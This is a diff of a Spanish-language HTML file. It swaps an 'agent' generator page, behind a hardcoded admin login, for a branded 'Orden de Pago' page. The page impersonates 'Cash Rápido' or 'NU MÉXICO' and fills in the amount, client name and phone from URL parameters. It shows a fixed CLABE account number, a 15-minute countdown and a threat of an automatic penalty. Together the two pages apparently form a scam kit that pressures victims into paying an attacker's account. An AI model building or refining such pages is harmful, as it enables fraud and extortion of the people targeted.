@@ -3,142 +3,101 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Generador Profesional</title>
+    <title>Orden de Pago</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap');
-        body { font-family: 'Inter', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; background: linear-gradient(-45deg, #0b1120, #1e293b, #0d9488, #0b1120); background-size: 400% 400%; animation: gradientMove 10s ease infinite; }
-        @keyframes gradientMove { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
-        .app-card { width: 100%; max-width: 440px; background: white; border-radius: 2.5rem; overflow: hidden; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); position: relative; }
-        #login-screen { display: flex; flex-direction: column; align-items: center; justify-content: center; width: 100%; padding: 2rem; }
-        #main-content { display: none; width: 100%; }
-        .input-monto::-webkit-inner-spin-button { display: none; }
+        body { font-family: 'Inter', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; background: #f1f5f9; }
+        .app-card { width: 100%; max-width: 440px; background: white; border-radius: 2.5rem; overflow: hidden; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.1); }
     </style>
 </head>
 <body>
 
     <div class="app-card">
-        <div id="login-screen" class="space-y-6 py-12">
-            <div class="text-center">
-                <h2 class="text-2xl font-black text-slate-800 uppercase tracking-tighter">Acceso de Agente</h2>
-                <p class="text-xs text-slate-400 font-bold uppercase">Introduce tus credenciales</p>
+        <div id="header-bg" class="pt-12 pb-6 text-center transition-colors duration-500">
+            <div class="w-24 h-24 bg-white rounded-3xl mx-auto mb-4 flex items-center justify-center overflow-hidden border-4 border-white/20 shadow-lg">
+                <img id="img-app" src="" class="w-full h-full object-cover">
             </div>
-            <div class="w-full space-y-4 px-8">
-                <input type="text" id="user" placeholder="Usuario" class="w-full border-b-2 py-3 px-4 outline-none font-bold text-center text-slate-700 uppercase">
-                <input type="password" id="pass" placeholder="Contraseña" class="w-full border-b-2 py-3 px-4 outline-none font-bold text-center text-slate-700">
-                <button onclick="checkLogin()" class="w-full bg-slate-900 text-white py-4 rounded-2xl font-black uppercase text-xs tracking-widest hover:bg-black transition-all">Ingresar</button>
-            </div>
-            <p id="error-msg" class="text-red-500 text-[10px] font-black uppercase hidden text-center">Credenciales Incorrectas</p>
+            <h2 id="txt-app" class="text-white font-black uppercase text-xl tracking-tighter italic"></h2>
         </div>
 
-        <div id="main-content">
-            <div id="header-bg" class="bg-[#0d9488] pt-10 pb-4 text-center transition-colors duration-500">
-                <div class="w-20 h-20 bg-white rounded-3xl mx-auto mb-4 flex items-center justify-center overflow-hidden border-4 border-white/20">
-                    <img id="img-previa" src="" class="w-full h-full object-cover">
+        <div class="p-8 space-y-8">
+            <div class="text-center space-y-1">
+                <span class="text-[10px] font-bold text-slate-400 uppercase tracking-widest">Monto a Pagar</span>
+                <div id="txt-monto" class="text-5xl font-black text-slate-800 tracking-tighter"></div>
+                <div id="contador" class="text-red-600 font-black text-xl mt-2">15:00</div>
+            </div>
+
+            <div class="space-y-4 bg-slate-50 p-6 rounded-[2rem] border border-slate-100">
+                <div class="flex justify-between items-center border-b border-slate-200/60 pb-3">
+                    <span class="text-[10px] font-bold text-slate-400 uppercase">Cliente</span>
+                    <span id="txt-nom" class="text-xs font-black text-slate-700 uppercase"></span>
                 </div>
-                <div class="px-8 mb-4">
-                    <select id="prod" onchange="updateUI()" class="w-full border-none rounded-xl px-4 py-2 font-bold text-center outline-none bg-white">
-                        <option value="cashrapido|#0d9488|#ea580c|image_52e678.png">Cash Rápido</option>
-                        <option value="nu|#820ad1|#581c87|">NU MÉXICO</option>
-                    </select>
+                <div class="flex justify-between items-center border-b border-slate-200/60 pb-3">
+                    <span class="text-[10px] font-bold text-slate-400 uppercase">Teléfono</span>
+                    <span id="txt-tel" class="text-xs font-black text-slate-700"></span>
                 </div>
-                <div id="monto-bg" class="bg-[#ea580c] mx-6 p-6 rounded-[1.5rem] text-left text-white transition-colors duration-500">
-                    <span class="text-[10px] font-bold opacity-70 uppercase">Monto de Pago</span>
-                    <div class="flex items-center text-4xl font-black">
-                        <span>$</span>
-                        <input type="number" id="monto" value="0.00" step="0.01" class="input-monto bg-transparent border-none outline-none w-full text-white ml-1">
+                <div class="flex justify-between items-center border-b border-slate-200/60 pb-3">
+                    <span class="text-[10px] font-bold text-slate-400 uppercase">Banco</span>
+                    <span id="txt-banco" class="text-xs font-black text-slate-700 uppercase"></span>
+                </div>
+                <div class="flex flex-col items-center pt-2">
+                    <span class="text-[10px] font-bold text-slate-400 uppercase mb-2">CLABE / LIGA DE PAGO</span>
+                    <div class="flex items-center space-x-2">
+                        <span id="txt-clabe" class="text-sm font-black text-blue-600 tracking-wider"></span>
+                        <button onclick="copiarLiga()" class="bg-blue-100 p-1.5 rounded-lg hover:bg-blue-200 transition-colors">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 text-blue-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 7v8a2 2 0 002 2h6M8 7V5a2 2 0 012-2h4.586a1 1 0 01.707.293l4.414 4.414a1 1 0 01.293.707V15a2 2 0 01-2 2h-2M8 7H6a2 2 0 00-2 2v10a2 2 0 002 2h8a2 2 0 002-2v-2" />
+                            </svg>
+                        </button>
                     </div>
                 </div>
             </div>
 
-            <div class="p-6 space-y-4 text-sm font-bold text-slate-800">
-                <div class="flex justify-between border-b pb-2"><span class="text-gray-400 uppercase text-[10px]">Importe</span><span id="l-monto">$0.00</span></div>
-                
-                <div class="flex justify-between border-b pb-2">
-                    <span class="text-gray-400 uppercase text-[10px]">Fecha Vencimiento</span>
-                    <input type="date" id="fecha" onchange="calcDias()" class="outline-none text-right font-bold bg-white">
-                </div>
-                <div class="flex justify-between border-b pb-2">
-                    <span class="text-gray-400 uppercase text-[10px]">Días Vencimiento</span>
-                    <span id="l-dias" class="font-black text-lg">0</span>
-                </div>
-
-                <div class="bg-gray-50 rounded-[2rem] p-6 text-center space-y-3 border border-gray-100">
-                    <span class="text-[10px] text-gray-400 uppercase">Método de Pago</span>
-                    <select id="metodo" onchange="updateClabe()" class="w-full border rounded-xl p-2 text-center outline-none bg-white font-black text-xs">
-                        <option value="NU MÉXICO">NU MÉXICO</option>
-                    </select>
-                    <span class="text-[10px] text-gray-400 uppercase">Liga de Pago</span>
-                    <div id="display-clabe" class="w-full border rounded-xl p-2 text-center text-blue-600 bg-white font-black text-sm">638180000172548559</div>
-                </div>
-
-                <div class="space-y-2">
-                    <input type="text" id="nom" placeholder="Nombre del cliente" class="w-full border-b py-2 text-center outline-none uppercase font-bold">
-                    <input type="tel" id="tel" placeholder="Número del cliente (10 dígitos)" class="w-full border-b py-2 text-center outline-none font-bold">
-                </div>
-
-                <button onclick="generar()" id="btn" class="w-full bg-[#ea580c] text-white py-4 rounded-2xl font-black uppercase tracking-widest text-xs">GENERAR ORDEN</button>
+            <div class="text-center space-y-3">
+                <p class="text-[10px] text-red-600 font-black uppercase leading-tight italic">
+                    ⚠️ ADVERTENCIA: TIENES UN TIEMPO LÍMITE DE 15 MINUTOS PARA REALIZAR EL PAGO, DE LO CONTRARIO SE TE COBRARÁ UNA PENALIZACIÓN AUTOMÁTICA.
+                </p>
+                <p class="text-[10px] text-slate-400 font-medium px-4">
+                    Realiza tu pago antes del vencimiento para evitar cargos adicionales por mora.
+                </p>
             </div>
         </div>
     </div>
 
     <script>
-        function checkLogin() {
-            const u = document.getElementById('user').value.toLowerCase();
-            const p = document.getElementById('pass').value;
-            if(u === "admin" && p === "12345678990") {
-                document.getElementById('login-screen').style.display = 'none';
-                document.getElementById('main-content').style.display = 'block';
-                updateUI();
-            } else { document.getElementById('error-msg').classList.remove('hidden'); }
-        }
+        const p = new URLSearchParams(window.location.search);
+        const v = p.get('v');
 
-        function updateUI() {
-            const val = document.getElementById('prod').value.split('|');
-            document.getElementById('header-bg').style.backgroundColor = val[1];
-            document.getElementById('monto-bg').style.backgroundColor = val[2];
-            document.getElementById('btn').style.backgroundColor = val[2];
-            document.getElementById('img-previa').src = val[3];
-        }
+        const apps = {
+            'cashrapido': { n: 'Cash Rápido', c: '#0d9488', i: 'image_52e678.png' },
+            'nu': { n: 'NU MÉXICO', c: '#820ad1', i: '' }
+        };
 
-        function updateClabe() {
-            const banco = document.getElementById('metodo').value;
-            const display = document.getElementById('display-clabe');
-            if(banco === "NU MÉXICO") {
-                display.innerText = "638180000172548559";
-            }
-        }
+        const config = apps[v] || apps['cashrapido'];
 
-        document.getElementById('fecha').valueAsDate = new Date();
-        document.getElementById('monto').addEventListener('input', (e) => { 
-            document.getElementById('l-monto').innerText = '$' + (e.target.value || "0.00"); 
-        });
+        document.getElementById('header-bg').style.backgroundColor = config.c;
+        document.getElementById('img-app').src = config.i;
+        document.getElementById('txt-app').innerText = config.n;
+        document.getElementById('txt-monto').innerText = '$' + (p.get('m') || '0.00');
+        document.getElementById('txt-nom').innerText = p.get('n') || 'Cliente';
+        document.getElementById('txt-tel').innerText = p.get('t') || '0000000000';
+        document.getElementById('txt-banco').innerText = p.get('b') || 'NU MÉXICO';
+        document.getElementById('txt-clabe').innerText = p.get('c') || '638180000172548559';
 
-        function calcDias() {
-            const f = new Date(document.getElementById('fecha').value);
-            const hoy = new Date();
-            hoy.setHours(0,0,0,0); f.setHours(0,0,0,0);
-            const diffTime = hoy - f;
-            const diffDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24));
-            const el = document.getElementById('l-dias');
-            if (diffDays > 0) { el.innerText = diffDays; el.style.color = "#ef4444"; } 
-            else { el.innerText = "0"; el.style.color = "#1e293b"; }
-        }
+        let tiempo = 900; 
+        const display = document.getElementById('contador');
+        const timer = setInterval(() => {
+            let min = Math.floor(tiempo / 60);
+            let seg = tiempo % 60;
+            display.innerText = `${min}:${seg < 10 ? '0' : ''}${seg}`;
+            if (--tiempo < 0) clearInterval(timer);
+        }, 1000);
 
-        function generar() {
-            const sel = document.getElementById('prod');
-            const data = sel.value.split('|');
-            const p = new URLSearchParams({
-                m: document.getElementById('monto').value,
-                n: document.getElementById('nom').value || "Cliente",
-                t: document.getElementById('tel').value || "0000000000",
-                v: data[0],
-                b: document.getElementById('metodo').value,
-                c: document.getElementById('display-clabe').innerText,
-                f: document.getElementById('fecha').value,
-                s: Date.now()
-            });
-            window.location.href = `detalle.html?${p.toString()}`;
+        function copiarLiga() {
+            const clabe = document.getElementById('txt-clabe').innerText;
+            navigator.clipboard.writeText(clabe);
+            alert("¡Liga copiada!");
         }
     </script>
 </body>
